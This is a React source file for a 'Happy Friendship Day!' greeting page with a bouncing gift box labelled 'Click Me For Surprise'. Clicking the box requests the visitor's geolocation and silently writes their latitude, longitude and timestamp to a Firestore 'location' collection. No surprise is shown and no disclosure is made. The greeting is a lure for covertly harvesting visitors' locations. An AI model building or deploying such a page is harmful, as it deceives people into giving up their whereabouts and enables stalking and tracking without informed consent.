import React, { useState } from 'react';
import styled from 'styled-components';
import { motion } from 'framer-motion';
import { addDoc, collection} from "firebase/firestore";
import { database } from "./firebase";
const Container = styled.div`
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height: 100vh;
  background-color: #f5f5f5;
  text-align: center;
`;

const Title = styled.h1`
  font-size: 3em;
  color: #ff6347;
`;

const SurpriseBox = styled(motion.div)`
  width: auto;
  height: auto;
  padding: 20px;
  background-color: #ff6347;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  border-radius: 10px;
  cursor: pointer;
  font-size: 1.5em;
  color: white;
  margin-top: 20px;
`;

const App = () => {
  const [location, setLocation] = useState(null);
  const postsCollectionRef = collection(database,"location");
  const handleBoxClick = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const locData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            timestamp: new Date().toISOString(),
          };

          // Save location data to Firebase
          await addDoc(postsCollectionRef,locData)

          setLocation(locData);
        },
        () => {
          alert('Location access denied');
        }
      );
    } else {
      alert('Geolocation is not supported by this browser.');
    }
  };

  return (
    <Container>
      <Title>Happy Friendship Day!</Title>
      <SurpriseBox
        animate={{ y: [0, -10, 0] }}
        transition={{ repeat: Infinity, duration: 0.5 }}
        onClick={handleBoxClick}
      >
        <h1 >🎁</h1><p>Click Me For Surprise</p>
      </SurpriseBox>
      
    </Container>
  );
};

export default App;
